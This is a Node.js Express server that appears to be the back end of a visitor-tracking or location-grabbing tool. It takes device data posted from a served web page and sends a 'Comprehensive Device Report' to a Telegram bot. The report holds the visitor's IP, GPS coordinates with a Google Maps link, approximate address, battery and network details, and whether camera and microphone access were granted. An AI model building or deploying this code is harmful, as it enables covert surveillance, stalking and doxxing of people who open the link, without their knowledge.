require('dotenv').config();
const express = require('express');
const path = require('path');
const axios = require('axios');
const useragent = require('useragent');
const publicIp = require('public-ip');
const geoip = require('geoip-lite');
const si = require('systeminformation');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Enhanced Telegram sender
app.post('/send-to-telegram', async (req, res) => {
  try {
    const { deviceInfo } = req.body;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // Get additional server-side info
    const ipInfo = geoip.lookup(deviceInfo.ip);
    const timestamp = new Date().toLocaleString();

    const message = `
🚀 *Comprehensive Device Report* 🚀
📅 *Time:* ${timestamp}
🌐 *IP:* ${deviceInfo.ip || 'N/A'} (${ipInfo?.country || 'Unknown'})
📌 *Location:* 
   - Coordinates: ${deviceInfo.location ? `${deviceInfo.location.latitude}, ${deviceInfo.location.longitude}` : 'N/A'}
   - Google Maps: ${deviceInfo.location ? `https://www.google.com/maps?q=${deviceInfo.location.latitude},${deviceInfo.location.longitude}` : 'N/A'}
   - Approx. Address: ${deviceInfo.approxAddress || 'N/A'}

📱 *Device Info:*
   - OS: ${deviceInfo.os || 'N/A'}
   - Browser: ${deviceInfo.browser || 'N/A'}
   - Device: ${deviceInfo.device || 'N/A'}
   - CPU Cores: ${deviceInfo.cpuCores || 'N/A'}
   - Screen: ${deviceInfo.screen || 'N/A'}
   - Memory: ${deviceInfo.memory || 'N/A'}
   - Touch Support: ${deviceInfo.isTouchDevice ? 'Yes' : 'No'}

🔋 *Battery:*
   - Level: ${deviceInfo.battery ? `${deviceInfo.battery.level * 100}%` : 'N/A'}
   - Charging: ${deviceInfo.battery ? (deviceInfo.battery.charging ? 'Yes' : 'No') : 'N/A'}

📷 *Permissions:*
   - Camera: ${deviceInfo.cameraAccess ? 'Granted ✅' : 'Denied ❌'}
   - Microphone: ${deviceInfo.microphoneAccess ? 'Granted ✅' : 'Denied ❌'}
   - Notifications: ${deviceInfo.notificationPermission || 'N/A'}

🛡️ *Security:*
   - Cookies: ${deviceInfo.cookiesEnabled ? 'Enabled' : 'Disabled'}
   - Do Not Track: ${deviceInfo.doNotTrack ? 'Enabled' : 'Disabled'}
   - Online Status: ${deviceInfo.onlineStatus ? 'Online' : 'Offline'}

📊 *Network:*
   - Connection: ${deviceInfo.connection || 'N/A'}
   - Bandwidth: ${deviceInfo.bandwidth || 'N/A'}
   - RTT: ${deviceInfo.rtt || 'N/A'}

🔍 *Additional Info:*
   - User Agent: ${deviceInfo.userAgent || 'N/A'}
   - Language: ${deviceInfo.language || 'N/A'}
   - Timezone: ${deviceInfo.timezone || 'N/A'}
   - Platform: ${deviceInfo.platform || 'N/A'}
   - Vendor: ${deviceInfo.vendor || 'N/A'}
   - Product: ${deviceInfo.product || 'N/A'}
`;

    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: false
    });

    res.status(200).send('Data sent to Telegram');
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).send('Error sending data');
  }
});

// Serve the HTML file for all routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});